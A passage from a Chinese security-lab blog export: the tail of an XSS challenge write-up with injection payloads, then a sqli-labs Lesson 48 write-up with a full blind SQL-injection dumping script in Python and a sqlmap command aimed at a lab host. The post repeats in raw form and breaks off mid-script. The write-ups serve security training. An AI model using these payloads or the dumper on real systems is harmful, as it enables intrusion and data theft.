class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. &lt;img src <span class=\"attribute\">onerror</span>=<span class=\"string\">\"console.error('&amp;#39;);alert(&amp;#39;1')\"</span>&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/haozi/00F.png\" alt=\"00F\"></p>\n<h1 id=\"0x10\"><a href=\"#0x10\" class=\"headerlink\" title=\"0x10\"></a>0x10</h1><h2 id=\"server-code-16\"><a href=\"#server-code-16\" class=\"headerlink\" title=\"server code:\"></a>server code:</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span> (<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">&lt;script&gt;</span></span><br><span class=\"line\"><span class=\"string\">  window.data = <span class=\"subst\">$&#123;input&#125;</span></span></span><br><span class=\"line\"><span class=\"string\">&lt;/script&gt;</span></span><br><span class=\"line\"><span class=\"string\">  `</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-16\"><a href=\"#分析-16\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight gcode\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">用；拆分加上alert<span class=\"comment\">(1)</span>就行。</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"input-code-16\"><a href=\"#input-code-16\" class=\"headerlink\" title=\"input code:\"></a>input code:</h2><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span> <span class=\"number\">123</span>;alert(<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"html-16\"><a href=\"#html-16\" class=\"headerlink\" title=\"html:\"></a>html:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.  </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"built_in\">window</span>.data = <span class=\"number\">123</span>;alert(<span class=\"number\">1</span>)</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/haozi/010.png\" alt=\"010\"></p>\n<h1 id=\"0x11\"><a href=\"#0x11\" class=\"headerlink\" title=\"0x11\"></a>0x11</h1><h2 id=\"server-code-17\"><a href=\"#server-code-17\" class=\"headerlink\" title=\"server code:\"></a>server code:</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// from alf.nu</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span> (<span class=\"params\">s</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escapeJs</span> (<span class=\"params\">s</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">String</span>(s)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/\\\\/g</span>, <span class=\"string\">'\\\\\\\\'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/'/g</span>, <span class=\"string\">'\\\\\\''</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/\"/g</span>, <span class=\"string\">'\\\\\"'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/`/g</span>, <span class=\"string\">'\\\\`'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/&lt;/g</span>, <span class=\"string\">'\\\\74'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/&gt;/g</span>, <span class=\"string\">'\\\\76'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/\\//g</span>, <span class=\"string\">'\\\\/'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/\\n/g</span>, <span class=\"string\">'\\\\n'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/\\r/g</span>, <span class=\"string\">'\\\\r'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/\\t/g</span>, <span class=\"string\">'\\\\t'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/\\f/g</span>, <span class=\"string\">'\\\\f'</span>)</span><br><span class=\"line\">            .replace(<span class=\"regexp\">/\\v/g</span>, <span class=\"string\">'\\\\v'</span>)</span><br><span class=\"line\">            <span class=\"comment\">// .replace(/\\b/g, '\\\\b')</span></span><br><span class=\"line\">            .replace(<span class=\"regexp\">/\\0/g</span>, <span class=\"string\">'\\\\0'</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  s = escapeJs(s)</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">&lt;script&gt;</span></span><br><span class=\"line\"><span class=\"string\">  var url = 'javascript:console.log(\"<span class=\"subst\">$&#123;s&#125;</span>\")'</span></span><br><span class=\"line\"><span class=\"string\">  var a = document.createElement('a')</span></span><br><span class=\"line\"><span class=\"string\">  a.href = url</span></span><br><span class=\"line\"><span class=\"string\">  document.body.appendChild(a)</span></span><br><span class=\"line\"><span class=\"string\">  a.click()</span></span><br><span class=\"line\"><span class=\"string\">&lt;/script&gt;</span></span><br><span class=\"line\"><span class=\"string\">`</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-17\"><a href=\"#分析-17\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight taggerscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">将\"替代<span class=\"symbol\">\\\"</span>,构造闭合绕过,这里的坑是它替代的<span class=\"symbol\">\\需</span>要手动加一个、</span><br><span class=\"line\">因为\" 被转义成 <span class=\"symbol\">\\\"</span> 经过html 解析后 console.log(\"<span class=\"symbol\">\\\"</span>)会报语法错误, 再补个 <span class=\"symbol\">\\ </span>即可</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"input-code-17\"><a href=\"#input-code-17\" class=\"headerlink\" title=\"input code:\"></a>input code:</h2><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span> <span class=\"string\">\"),alert(\"</span><span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"html-17\"><a href=\"#html-17\" class=\"headerlink\" title=\"html:\"></a>html:</h2><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>.  </span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">  <span class=\"selector-tag\">var</span> url = <span class=\"string\">'javascript:console.log(\"\\\"),alert(\\\"1\")'</span></span><br><span class=\"line\">  <span class=\"selector-tag\">var</span> <span class=\"selector-tag\">a</span> = document.createElement(<span class=\"string\">'a'</span>)</span><br><span class=\"line\">  <span class=\"selector-tag\">a</span><span class=\"selector-class\">.href</span> = url</span><br><span class=\"line\">  document<span class=\"selector-class\">.body</span><span class=\"selector-class\">.appendChild</span>(a)</span><br><span class=\"line\">  <span class=\"selector-tag\">a</span>.click()</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/haozi/011.png\" alt=\"011\"></p>\n<h1 id=\"0x12\"><a href=\"#0x12\" class=\"headerlink\" title=\"0x12\"></a>0x12</h1><h2 id=\"server-code-18\"><a href=\"#server-code-18\" class=\"headerlink\" title=\"server code:\"></a>server code:</h2><figure class=\"highlight scilab\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// from alf.nu</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span> <span class=\"params\">(s)</span> &#123;</span></span><br><span class=\"line\">  s = s.replace(/<span class=\"string\">\"/g, '</span>\\\\<span class=\"string\">\"'</span>)</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"string\">'&lt;script&gt;console.log(\"</span><span class=\"string\">' + s + '</span><span class=\"string\">\");&lt;/script&gt;'</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-18\"><a href=\"#分析-18\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">构造闭合</span><br><span class=\"line\">1. 可以用”)闭合console.log(\",后利用注释</span><br><span class=\"line\">2. 用<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span>闭合<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"input-code-18\"><a href=\"#input-code-18\" class=\"headerlink\" title=\"input code:\"></a>input code:</h2><figure class=\"highlight xquery\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>. \\<span class=\"string\">\");alert(1)&lt;!-- 或 \\\"</span>);alert(<span class=\"number\">1</span>)//</span><br><span class=\"line\"><span class=\"number\">2</span>. </span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\"><span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">alert(1)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"html-18\"><a href=\"#html-18\" class=\"headerlink\" title=\"html:\"></a>html:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.  </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"\\\\\"</span>);alert(<span class=\"string\">`1`</span>);<span class=\"xml\"><span class=\"comment\">&lt;!--\");</span></span></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">2.</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"</span></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">alert(1)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">\");</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/haozi/012.png\" alt=\"012\"></p>\n"},{"title":"sqli-labs-lession 48 GET-基于错误-数字型盲注-OrderBy注入","date":"2018-11-06T01:02:48.000Z","_content":"\n# sqli-labs-lession 48 GET-基于错误-数字型盲注-OrderBy注入\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-48/001.png)\n\n## 分析\n\n这里没有了报错注入,使用盲注。\n\n经过判断为数字型\n\n`http://10.60.250.239/sql/Less-48/?sort=1 desc`\n\n![002](/img/sql/Lesson-48/002.png)\n\n## 注入\n\n可以利用rand(true/false)\n\n### 获取数据库长度\n\n`http://10.60.250.239/sql/Less-48/?sort=rand((select length(database()))=8)`\n\n![003](/img/sql/Lesson-48/003.png)\n\n接下来拿了之前的盲注脚本改了下跑这一题了。\n\n### 获取数据库名\n\n![004](/img/sql/Lesson-48/004.png)\n\n![005](/img/sql/Lesson-48/005.png)\n\n### 获取表名\n\n![006](/img/sql/Lesson-48/006.png)\n\n![007](/img/sql/Lesson-48/007.png)\n\n### 获取列名\n\n![008](/img/sql/Lesson-48/008.png)\n\n![009](/img/sql/Lesson-48/009.png)\n\n### 获取字段\n\n![010](/img/sql/Lesson-48/010.png)\n\n![011](/img/sql/Lesson-48/011.png)\n\n### 临时脚本\n\n```\nimport requests\nimport re\nimport threading\nfrom optparse import OptionParser\n\nheaders = {\n    'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0'}\n\n\ndef getpayload(url, payload):\n    return url + payload\n\n\ndef getbasehtml(url):\n    basehtml = requests.get(url, headers=headers).content\n    return basehtml\n\n\ndef binary_search_db(url, basehtml, payload):\n    i = 1\n    s = \"\"\n    while 1:\n        count = 0\n        mid = 0\n        low = 47\n        high = 57\n        while low <= high:\n            mid = int((low + high) / 2)\n            newpayload = payload % (i, mid)\n            html = requests.get(getpayload(url, newpayload),\n                                headers=headers).content\n            if basehtml == html:\n                low = mid + 1\n                count += 1\n            else:\n                high = mid - 1\n        if count != 0:\n            s = s + chr(int((low + high + 1) / 2))\n            i = i + 1\n        else:\n            break\n    return int(s)\n\n\ndef getdbnum(url, basehtml):\n    num = 0\n    payload = \"RAND(ORD(MID((SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),%d,1))>%d)\"\n    num = binary_search_db(url, basehtml, payload)\n    print('[+]数据库数 [%d]' % num)\n    return num\n\n\ndef get_all_db_len(url, basehtml, num):\n    thread = []\n    key = []\n    th = []\n    lenth = []\n    for i in range(num):\n        payload = \"RAND(ORD(MID((SELECT IFNULL(CAST(LENGTH(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA limit i,1),%d,1))>%d)\"\n        payload = re.sub(r'\\bi\\b', str(i), payload)\n        key.append(payload)\n\n    def run_thread(stri, i):\n        s = \"db\" + str(i) + \":\" + str(binary_search_db(url, basehtml, stri))\n        # print(s)\n        th.append(s)\n\n    for i in range(num):\n        t = threading.Thread(target=run_thread,\n                             args=(key[i], i,))\n        thread.append(t)\n        thread[i].start()\n\n    for i in range(num):\n        thread[i].join()\n    th.sort()\n    for i in th:\n        i = re.sub(r'db\\d+\\:', '', i)\n        lenth.append(i)\n    print(lenth)\n    return lenth\n\n# 取与法\n\n\ndef and_method(url, payload):\n    two = [1, 2, 4, 8, 16, 32, 64, 128]\n    s = 0\n    keys = []\n    thread = []\n    m = []\n    basehtml = requests.get(\n        'http://10.60.250.239/sql/Less-48/?sort=RAND(true)', headers=headers).content\n\n    def run_thread(url, i, s):\n        html = requests.get(url, headers=headers).content\n        if (basehtml == html):\n            s = s | two[i]\n            m.append(s)\n\n    for i in range(8):\n        newpayload = \"\"\n        newpayload = payload + \"%26\" + \"%d=%d)\" % (two[i], two[i])\n        keys.append(newpayload)\n\n    for i in range(8):\n        t = threading.Thread(target=run_thread, args=(\n            getpayload(url, keys[i]), i, s,))\n        thread.append(t)\n\n    for t in thread:\n        t.start()\n    for t in thread:\n        t.join()\n\n    for i in m:\n        s = s | i\n    return chr(s)\n\n\ndef getdbname(url, basehtml):\n    num = getdbnum(url, basehtml)\n    lenth = get_all_db_len(url, basehtml, num)\n    dbs = []\n\n    for i in range(int(len(lenth))):\n        dbname = \"\"\n        for j in range(1, int(lenth[i]) + 1):\n            payload = \"RAND(ascii(substr((select schema_name from information_schema.schemata limit %d,1),%d,1))\" % (\n                i, j)\n            dbname += and_method(url, payload)\n            print('[-]当前猜解', dbname)\n        print(dbname)\n        dbs.append(dbname)\n    print('available databases [%s]' % num)\n    for db in dbs:\n        print('[*]', db)\n\n\ndef get_table_num(url, basehtml, dbname):\n    num = 0\n    payload = \"RAND(ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s'),\" % dbname\n    payload += \"%d,1))>%d)\"\n    # print(payload)\n    num = binary_search_db(url, basehtml, payload)\n    print('[+]数据表数 [%d]' % num)\n    return num\n\n\ndef get_all_table_len(url, basehtml, num, dbname):\n    thread = []\n    key = []\n    th = []\n    lenth = []\n    for i in range(num):\n        payload = \"RAND(ORD(MID((SELECT IFNULL(CAST(LENGTH(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s' limit i,1),\" % dbname\n        payload += \"%d,1))>%d)\"\n        payload = re.sub(r'\\bi\\b', str(i), payload)\n        key.append(payload)\n\n    def run_thread(stri, i):\n        s = \"db\" + str(i) + \":\" + str(binary_search_db(url, basehtml, stri))\n        # print(s)\n        th.append(s)\n\n    for i in range(num):\n        t = threading.Thread(target=run_thread,\n                             args=(key[i], i,))\n        thread.append(t)\n        thread[i].start()\n\n    for i in range(num):\n        thread[i].join()\n    th.sort()\n    for i in th:\n        i = re.sub(r'db\\d+\\:', '', i)\n        lenth.append(i)\n    return lenth\n\n\ndef get_table_name(url, basehtml, dbname):\n    num = get_table_num(url, basehtml, dbname)\n    lenth = get_all_table_len(url, basehtml, num, dbname)\n    tables = []\n\n    for i in range(int(len(lenth))):\n        tbname = \"\"\n        for j in range(1, int(lenth[i]) + 1):\n            payload = \"RAND(ascii(substr((select table_name from information_schema.tables WHERE TABLE_SCHEMA='%s' limit\" % dbname\n            payload += \" %d,1),%d,1))\" % (i, j)\n            tbname += and_method(url, payload)\n            print('[-]当前猜解', tbname)\n        print(tbname)\n        tables.append(tbname)\n    print('Database: %s' % dbname)\n    print('[%d tables]' % num)\n    for table in tables:\n        print('[*]', table)\n\n# 获取列数\n\n\ndef get_column_num(url, basehtml, tbname, dbname):\n    num = 0\n    payload = \"RAND(ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s'),\" % (\n        tbname, dbname)\n    payload += \"%d,1))>%d)\"\n    num = binary_search_db(url, basehtml, payload)\n    print('[+]列数 [%d]' % num)\n    return num\n\n# 获取列长度\n\n\ndef get_all_columns_len(url, basehtml, num, tbname, dbname):\n    thread = []\n    key = []\n    th = []\n    lenth = []\n    for i in range(num):\n        payload = \"RAND(ORD(MID((SELECT IFNULL(CAST(LENGTH(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s' limit i,1),\" % (\n            tbname, dbname)\n        payload += \"%d,1))>%d)\"\n        payload = re.sub(r'\\bi\\b', str(i), payload)\n        key.append(payload)\n\n    def run_thread(stri, i):\n        s = \"co\" + str(i) + \":\" + str(binary_search_db(url, basehtml, stri))\n        # print(s)\n        th.append(s)\n\n    for i in range(num):\n        t = threading.Thread(target=run_thread,\n                             args=(key[i], i,))\n        thread.append(t)\n        thread[i].start()\n\n    for i in range(num):\n        thread[i].join()\n    th.sort()\n    for i in th:\n        i = re.sub(r'co\\d+\\:', '', i)\n        lenth.append(i)\n    return lenth\n\n# 获取列名\n\n\ndef get_column_name(url, basehtml, tbname, dbname):\n    num = get_column_num(url, basehtml, tbname, dbname)\n    lenth = get_all_columns_len(url, basehtml, num, tbname, dbname)\n    columns = []\n\n    for i in range(int(len(lenth))):\n        coname = \"\"\n        for j in range(1, int(lenth[i]) + 1):\n            payload = \"RAND(ascii(substr((select column_name from information_schema.columns where table_name='%s' AND table_schema='%s' limit\" % (\n                tbname, dbname)\n            payload += \" %d,1),%d,1))\" % (i, j)\n            coname += and_method(url, payload)\n            print('[-]当前猜解', coname)\n        print(coname)\n        columns.append(coname)\n    print('Database: %s' % dbname)\n    print('Table: %s' % tbname)\n    print('[%d columns]' % num)\n    for column in columns:\n        print('[*]', column)\n    return columns\n\n# 获取字段数\n\n\ndef get_data_num(url, basehtml, tbname, dbname):\n    num = 0\n    payload = \"RAND(ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM %s.%s),\" % (dbname, tbname)\n    payload += \" %d,1))>%d)\"\n    num = binary_search_db(url, basehtml, payload)\n    print('[+]字段数 [%d]' % num)\n    return num\n\n# 获取字段长度\n\n\ndef get_data_len(url, basehtml, coname, tbname, dbname, i):\n    payload = \"RAND(ORD(MID((SELECT IFNULL(CAST(LENGTH(%s) AS CHAR),0x20) FROM %s.%s limit %d,1),\" % (\n        coname, dbname, tbname, i)\n    payload += \" %d,1))>%d)\"\n    lenth = binary_search_db(url, basehtml, payload)\n    print('[+]当前字段`%s`长度: %d' % (coname, lenth))\n    return lenth\n\n# 获取字段值\n\n\ndef get_data(url, basehtml, coname, tbname, dbname, count):\n    lenth = get_data_len(url, basehtml, coname, tbname, dbname, count)\n    data = \"\"\n    for i in range(lenth):\n        payload = \"RAND(ascii(substr((select %s from %s.%s limit %d,1),%d,1))\" % (\n            coname, dbname, tbname, count, i + 1)\n        data += and_method(url, payload)\n        print('[-]当前猜解', data)\n    print(data)\n    return data\n\n\ndef dump(url, basehtml, tbname, dbname, coname=None):\n    num = get_data_num(url, basehtml, tbname, dbname)\n    if coname is None:\n        columns = get_column_name(url, basehtml, tbname, dbname)\n    else:\n        columns = coname.split(\",\")\n    print(columns)\n    datas = []\n    for i in range(num):\n        for column in columns:\n            data = get_data(url, basehtml, column, tbname, dbname, i)\n            datas.append(data)\n        datas.append('.')\n\n    res = [s.split() for s in ' '.join(datas).split('.') if s]\n\n    for i in res:\n        for j in i:\n            print('%-15s' % j, end='')\n        print(\"\\n\")\n\n\ndef main():\n    parser = OptionParser()\n    parser.add_option('-u', '--url', type='string', dest='url',\n                      help='Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")')\n    parser.add_option('-D', type='string', dest='db',\n                      help='DBMS database to enumerate')\n    parser.add_option('-T', type='string', dest='tbl',\n                      help='DBMS database table(s) to enumerate')\n    parser.add_option('-C', type='string', dest='col',\n                      help='DBMS database table column(s) to enumerate, use like id,password')\n    parser.add_option('--dbs', action='store_true',\n                      dest='dbs', help='Enumerate ALL database')\n    parser.add_option('--tables', action='store_true',\n                      dest='tables', help='Enumerate DBMS database tables')\n    parser.add_option('--columns', action='store_true',\n                      dest='columns', help='Enumerate DBMS database table columns')\n    parser.add_option('--dump', action='store_true',\n                      dest='dump', help='Dump DBMS database table entries')\n    parser.add_option('--dump-all', action='store_true',\n                      dest='all', help='Dump all DBMS databases tables entries')\n    (options, args) = parser.parse_args()\n\n    basehtml = getbasehtml(\n        'http://10.60.250.239/sql/Less-48/?sort=RAND(true)')\n\n    if options.url and options.dbs:\n        url = options.url\n        getdbname(url, basehtml)\n    elif options.url and options.db and options.tables:\n        url = options.url\n        dbname = options.db\n        get_table_name(url, basehtml, dbname)\n    elif (options.url and options.db and options.tbl and options.col and options.dump):\n        url = options.url\n        dbname = options.db\n        tbname = options.tbl\n        coname = options.col\n        dump(url, basehtml, tbname, dbname, coname)\n    elif (options.url and options.db and options.tbl and options.all):\n        url = options.url\n        dbname = options.db\n        tbname = options.tbl\n        dump(url, basehtml, tbname, dbname)\n    elif (options.url and options.db and options.tbl and options.columns):\n        url = options.url\n        dbname = options.db\n        tbname = options.tbl\n        get_column_name(url, basehtml, tbname, dbname)\n    else:\n        parser.print_help()\n\n\nif __name__ == '__main__':\n    main()\n\n```\n\n\n\n## SQLMAP\n\n`sqlmap -u http://10.60.250.239/sql/Less-48/?sort=1 --technique B --level 2 --risk 2 --dbms mysql --threads 25`\n\n![012](/img/sql/Lesson-48/012.png)\n\n![013](/img/sql/Lesson-48/013.png)\n\n直接上结果\n\n![014](/img/sql/Lesson-48/014.png)\n\n![015](/img/sql/Lesson-48/015.png)","source":"_posts/sqli-labs-lession-48-GET-基于错误-数字型盲注-OrderBy注入.md","raw":"---\ntitle: sqli-labs-lession 48 GET-基于错误-数字型盲注-OrderBy注入\ndate: 2018-11-06 09:02:48\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs-lession 48 GET-基于错误-数字型盲注-OrderBy注入\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-48/001.png)\n\n## 分析\n\n这里没有了报错注入,使用盲注。\n\n经过判断为数字型\n\n`http://10.60.250.239/sql/Less-48/?sort=1 desc`\n\n![002](/img/sql/Lesson-48/002.png)\n\n## 注入\n\n可以利用rand(true/false)\n\n### 获取数据库长度\n\n`http://10.60.250.239/sql/Less-48/?sort=rand((select length(database()))=8)`\n\n![003](/img/sql/Lesson-48/003.png)\n\n接下来拿了之前的盲注脚本改了下跑这一题了。\n\n### 获取数据库名\n\n![004](/img/sql/Lesson-48/004.png)\n\n![005](/img/sql/Lesson-48/005.png)\n\n### 获取表名\n\n![006](/img/sql/Lesson-48/006.png)\n\n![007](/img/sql/Lesson-48/007.png)\n\n### 获取列名\n\n![008](/img/sql/Lesson-48/008.png)\n\n![009](/img/sql/Lesson-48/009.png)\n\n### 获取字段\n\n![010](/img/sql/Lesson-48/010.png)\n\n![011](/img/sql/Lesson-48/011.png)\n\n### 临时脚本\n\n```\nimport requests\nimport re\nimport threading\nfrom optparse import OptionParser\n\nheaders = {\n    'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0'}\n\n\ndef getpayload(url, payload):\n    return url + payload\n\n\ndef getbasehtml(url):\n    basehtml = requests.get(url, headers=headers).content\n    return basehtml\n\n\ndef binary_search_db(url, basehtml, payload):\n    i = 1\n    s = \"\"\n    while 1:\n        count = 0\n        mid = 0\n        low = 47\n        high = 57\n        while low <= high:\n            mid = int((low + high) / 2)\n            newpayload = payload % (i, mid)\n            html = requests.get(getpayload(url, newpayload),\n                                headers=headers).content\n            if basehtml == html:\n                low = mid + 1\n                count += 1\n            else:\n                high = mid - 1\n        if count != 0:\n            s = s + chr(int((low + high + 1) / 2))\n            i = i + 1\n        else:\n            break\n    return int(s)\n\n\ndef getdbnum(url, basehtml):\n    num = 0\n    payload = \"RAND(ORD(MID((SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),%d,1))>%d)\"\n    num = binary_search_db(url, basehtml, payload)\n    print('[+]数据库数 [%d]' % num)\n    return num\n\n\ndef get_all_db_len(url, basehtml, num):\n    thread = []\n    key = []\n    th = []\n    lenth = []\n    for i in range(num):\n        payload = \"RAND(ORD(MID((SELECT IFNULL(CAST(LENGTH(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA limit i,1),%d,1))>%d)\"\n        payload = re.sub(r'\\bi\\b', str(i), payload)\n        key.append(payload)\n\n    def run_thread(stri, i):\n        s = \"db\" + str(i) + \":\" + str(binary_search_db(url, basehtml, stri))\n        # print(s)\n        th.append(s)\n\n    for i in range(num):\n        t = threading.Thread(target=run_thread,\n                             args=(key[i], i,))\n        thread.append(t)\n        thread[i].start()\n\n    for i in range(num):\n        thread[i].join()\n    th.sort()\n    for i in th:\n        i = re.sub(r'db\\d+\\:', '', i)\n        lenth.append(i)\n    print(lenth)\n    return lenth\n\n# 取与法\n\n\ndef and_method(url, payload):\n    two = [1, 2, 4, 8, 16, 32, 64, 128]\n    s = 0\n    keys = []\n    thread = []\n    m = []\n    basehtml = requests.get(\n        